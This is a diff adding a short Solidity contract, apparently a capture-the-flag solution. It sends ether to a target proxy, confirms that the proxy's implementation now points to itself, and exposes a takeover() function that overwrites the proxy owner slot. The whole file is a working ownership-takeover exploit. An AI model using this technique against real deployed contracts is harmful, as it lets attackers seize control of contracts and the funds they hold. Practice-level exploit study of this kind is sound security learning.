@@ -1,0 +1,25 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+interface LevelInterface {
+    function proxyOwner() external view returns (address);
+    function implementation() external view returns (address);
+}
+
+contract Solve {
+    address proxyOwner;
+
+    constructor (address addr) payable {
+        (bool result, ) = addr.call{value: msg.value}("");
+        require(result, "Failed to succeed");
+
+        LevelInterface level = LevelInterface(addr);
+        address impl = level.implementation();
+        require(impl == address(this), "Implementation is not this");
+    }
+
+    function takeover() external {
+        proxyOwner = msg.sender;
+    }
+}
